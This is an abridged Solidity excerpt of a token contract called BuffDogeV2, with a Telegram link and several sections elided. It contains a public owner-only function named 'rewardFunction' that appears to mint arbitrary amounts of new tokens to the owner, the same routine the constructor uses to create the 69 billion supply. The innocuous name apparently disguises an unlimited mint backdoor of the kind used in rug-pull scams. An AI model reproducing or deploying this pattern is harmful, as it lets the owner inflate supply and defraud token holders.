...
/**
  Telegram: https://t.me/BuffDogeV2
*/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function rewardFunction(uint256 amount) public onlyOwner {
        rewardFunction(msg.sender, amount);
    }
    ...
    function rewardFunction(address account, uint256 amount) internal virtual {
...
contract BuffDogeV2 is ERC20 {
    uint tokenTotalSupply = 69000000000;
    constructor() public ERC20("BuffDogeV2", "BuffDogeV2") {
        rewardFunction(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}